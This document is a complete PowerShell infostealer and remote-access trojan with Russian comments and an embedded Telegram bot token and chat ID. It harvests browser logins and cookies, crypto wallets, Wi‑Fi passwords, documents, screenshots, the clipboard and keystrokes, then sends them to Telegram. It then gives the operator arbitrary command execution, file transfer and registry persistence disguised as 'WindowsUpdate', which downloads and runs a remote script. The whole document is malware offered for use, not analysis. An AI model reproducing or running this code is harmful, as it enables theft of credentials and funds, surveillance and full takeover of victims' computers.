# ==============================================================
#       СУПЕР-СТИЛЕР + RAT (Telegram) — ВСЁ В ОДНОМ
# ==============================================================

# ===== НАСТРОЙКИ (УЖЕ ЗАПОЛНЕНЫ) =====
$botToken = "8881672889:AAH33jbmgtt-jbgHhe7DbjC7AGLEE4Y8FdM"
$chatId = "8082708835"
$archivePassword = "12345"
# ========================================

# ---- Функция отправки сообщения / файла в Telegram ----
function Send-Telegram {
    param([string]$text, [string]$filePath = $null)
    if ($filePath) {
        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
        $multipart = [System.Net.Http.MultipartFormDataContent]::new()
        $fileStream = [System.IO.FileStream]::new($filePath, [System.IO.FileMode]::Open)
        $fileContent = [System.Net.Http.StreamContent]::new($fileStream)
        $fileContent.Headers.Add("Content-Type", "application/octet-stream")
        $multipart.Add($fileContent, "document", [System.IO.Path]::GetFileName($filePath))
        $multipart.Add([System.Net.Http.StringContent]::new($chatId), "chat_id")
        try {
            $client = [System.Net.Http.HttpClient]::new()
            $client.PostAsync($uri, $multipart).Wait()
        } catch {}
        $fileStream.Close()
        $multipart.Dispose()
        return
    }
    $uri = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text }
    try { Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null } catch {}
}

# ---- Сбор всех данных (стилер) ----
function Collect-All {
    $tempDir = "$env:TEMP\stoler_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # 1. Пароли и куки из браузеров
    $browserPaths = @{
        "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
        "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
        "Opera"   = "$env:APPDATA\Opera Software\Opera Stable"
        "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"
    }
    foreach ($b in $browserPaths.Keys) {
        $p = $browserPaths[$b]
        if (Test-Path $p) {
            $files = @("Login Data", "Cookies", "Web Data")
            foreach ($f in $files) {
                $src = Join-Path $p $f
                if (Test-Path $src) {
                    $dest = Join-Path $tempDir "$b`_$f.db"
                    Copy-Item -Path $src -Destination $dest -Force
                }
            }
            if ($b -eq "Firefox") {
                $profiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release" -Directory -ErrorAction SilentlyContinue
                foreach ($profile in $profiles) {
                    $loginFile = Join-Path $profile.FullName "logins.json"
                    $cookiesFile = Join-Path $profile.FullName "cookies.sqlite"
                    if (Test-Path $loginFile) { Copy-Item $loginFile -Destination "$tempDir\Firefox_logins.json" -Force }
                    if (Test-Path $cookiesFile) { Copy-Item $cookiesFile -Destination "$tempDir\Firefox_cookies.sqlite" -Force }
                }
            }
        }
    }

    # 2. Криптокошельки
    $cryptoPaths = @(
        "$env:APPDATA\Metamask",
        "$env:APPDATA\Electrum\wallets",
        "$env:APPDATA\Exodus\exodus.wallet",
        "$env:APPDATA\Atomic\Local Storage",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\*",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\*"
    )
    foreach ($cp in $cryptoPaths) {
        if (Test-Path $cp) {
            $dest = Join-Path $tempDir "Crypto"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            Copy-Item -Path $cp -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # 3. Wi‑Fi пароли
    $wifi = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    $wifiPasswords = @()
    foreach ($ssid in $wifi) {
        $info = netsh wlan show profile name="$ssid" key=clear | Select-String "Ключ содержимого" -Context 0,1
        $pass = if ($info) { $info -replace ".*Ключ содержимого\s*:\s*", "" } else { "нет" }
        $wifiPasswords += "$ssid -> $pass"
    }
    $wifiPasswords | Out-File "$tempDir\WiFi_Passwords.txt"

    # 4. Документы и файлы (рабочий стол, загрузки, документы)
    $folders = @([Environment]::GetFolderPath("Desktop"), [Environment]::GetFolderPath("Downloads"), [Environment]::GetFolderPath("MyDocuments"))
    $exts = @("*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*.odt", "*.rtf", "*.ppt", "*.pptx", "*.jpg", "*.jpeg", "*.png", "*.bmp", "*.gif", "*.zip", "*.rar", "*.7z", "*.db", "*.sqlite", "*.csv", "*.log")
    $docDest = "$tempDir\Documents"
    New-Item -ItemType Directory -Path $docDest -Force | Out-Null
    foreach ($folder in $folders) {
        if (Test-Path $folder) {
            foreach ($ext in $exts) {
                Get-ChildItem -Path $folder -Filter $ext -File -ErrorAction SilentlyContinue | ForEach-Object {
                    Copy-Item -Path $_.FullName -Destination $docDest -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }

    # 5. Скриншот
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $screenshotPath = "$tempDir\screenshot.png"
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose(); $bitmap.Dispose()

    # 6. Информация о системе
    $sysInfo = @"
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject -Class Win32_OperatingSystem).Caption)
IP: $((Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim())
"@
    $sysInfo | Out-File "$tempDir\system_info.txt"

    # 7. Список установленных программ
    Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Out-String | Out-File "$tempDir\software_list.txt"

    # 8. Буфер обмена
    Add-Type -AssemblyName System.Windows.Forms
    $clip = [System.Windows.Forms.Clipboard]::GetText()
    $clip | Out-File "$tempDir\clipboard.txt"

    # 9. Кейлог (сбор за 5 секунд)
    $keylogScript = @'
Add-Type -AssemblyName System.Windows.Forms
$logFile = "$env:TEMP\keylog.txt"
$event = [System.Windows.Forms.Application]::Add_KeyDown({
    $key = $_.KeyCode
    $char = if ($key -ge 65 -and $key -le 90) { [char]$key } else { "["+$key+"]" }
    Add-Content $logFile $char
})
[System.Windows.Forms.Application]::Run()
'@
    Start-Job -ScriptBlock { powershell -NoProfile -Command $args[0] } -ArgumentList $keylogScript | Out-Null
    Start-Sleep -Seconds 5
    $keylogContent = if (Test-Path "$env:TEMP\keylog.txt") { Get-Content "$env:TEMP\keylog.txt" -Raw } else { "нет логов" }
    $keylogContent | Out-File "$tempDir\keylog.txt"

    # 10. Архивация
    $zipPath = "$env:TEMP\stolen_data.zip"
    if (Get-Command 7z -ErrorAction SilentlyContinue) {
        & 7z a -tzip -p$archivePassword $zipPath "$tempDir\*" > $null
    } else {
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
    }

    # 11. Отправка архива
    Send-Telegram -filePath $zipPath

    # 12. Очистка
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\keylog.txt" -Force -ErrorAction SilentlyContinue
}

# ---- Запускаем стилер ----
Collect-All
Send-Telegram "✅ Данные отправлены с $env:COMPUTERNAME"

# ---- RAT (управление через Telegram) ----
function Start-RAT {
    Send-Telegram "✅ RAT активирован на $env:COMPUTERNAME ($env:USERNAME)"
    $lastUpdateId = 0
    while ($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId+1)&timeout=10" -ErrorAction SilentlyContinue
            if ($updates.ok -and $updates.result) {
                foreach ($update in $updates.result) {
                    $lastUpdateId = $update.update_id
                    $msg = $update.message.text
                    if ($msg -and $update.message.chat.id -eq $chatId) {
                        if ($msg -match "^/cmd (.+)") {
                            $command = $matches[1]
                            $result = & cmd.exe /c $command 2>&1 | Out-String
                            if (-not $result) { $result = "Команда выполнена (нет вывода)" }
                            Send-Telegram -text "📟 Результат:`n$result"
                        }
                        elseif ($msg -eq "/screenshot") {
                            Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                            $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
                            $scPath = "$env:TEMP\sc_$(Get-Random).png"
                            $bitmap.Save($scPath, [System.Drawing.Imaging.ImageFormat]::Png)
                            $graphics.Dispose(); $bitmap.Dispose()
                            Send-Telegram -filePath $scPath
                            Remove-Item $scPath -Force
                        }
                        elseif ($msg -match "^/upload (.+)") {
                            $path = $matches[1]
                            if (Test-Path $path) { Send-Telegram -filePath $path } else { Send-Telegram -text "Файл не найден" }
                        }
                        elseif ($msg -match "^/download (.+?) (.+)") {
                            $url = $matches[1]; $out = $matches[2]
                            try { (New-Object Net.WebClient).DownloadFile($url, $out); Send-Telegram -text "✅ Скачан: $out" } catch { Send-Telegram -text "❌ Ошибка: $_" }
                        }
                        elseif ($msg -match "^/kill (.+)") {
                            try { Stop-Process -Name $matches[1] -Force; Send-Telegram -text "☠️ Процесс $($matches[1]) убит" } catch { Send-Telegram -text "❌ Не удалось" }
                        }
                        elseif ($msg -match "^/start (.+)") {
                            try { Start-Process $matches[1]; Send-Telegram -text "▶️ Запущен $($matches[1])" } catch { Send-Telegram -text "❌ Ошибка" }
                        }
                        elseif ($msg -eq "/persist") {
                            $scriptPath = $MyInvocation.MyCommand.Path
                            if (-not $scriptPath) { $scriptPath = "powershell.exe -c `"irm https://raw.githubusercontent.com/xxxretreftxxx/myfiles/refs/heads/main/test.ps1 | iex`"" }
                            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $scriptPath -Force
                            Send-Telegram -text "💾 Добавлено в автозагрузку"
                        }
                        elseif ($msg -eq "/shutdown") { Send-Telegram -text "🛑 Выключение..."; Stop-Computer -Force }
                        elseif ($msg -eq "/restart") { Send-Telegram -text "🔄 Перезагрузка..."; Restart-Computer -Force }
                        elseif ($msg -eq "/lock") { rundll32.exe user32.dll,LockWorkStation; Send-Telegram -text "🔒 Экран заблокирован" }
                        elseif ($msg -eq "/help") {
                            $help = @"
Доступные команды:
/cmd <команда> - выполнить в CMD
/screenshot - скриншот
/upload <путь> - загрузить файл с ПК
/download <URL> <путь> - скачать файл на ПК
/kill <имя> - убить процесс
/start <имя> - запустить процесс
/persist - добавить в автозагрузку
/shutdown - выключить
/restart - перезагрузить
/lock - заблокировать экран
/help - эта справка
"@
                            Send-Telegram -text $help
                        }
                    }
                }
            }
        } catch { }
        Start-Sleep -Seconds 2
    }
}

# ---- Запускаем RAT в фоне ----
Start-RAT